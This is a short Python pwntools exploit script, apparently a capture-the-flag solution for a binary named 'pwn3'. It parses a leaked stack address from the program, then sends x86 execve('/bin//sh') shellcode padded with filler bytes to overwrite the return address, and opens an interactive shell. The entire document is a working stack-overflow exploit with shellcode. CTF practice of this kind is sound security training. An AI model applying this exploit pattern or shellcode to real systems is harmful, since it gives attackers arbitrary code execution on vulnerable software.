#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./pwn3")
p = process(elf.path)

p.recvuntil(b"journey ")
a_buff = p32(int(p.recv(10).decode(), 16))

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += b"A" * (0x12e - len(payload))
payload += a_buff

p.sendline(payload)
p.interactive()

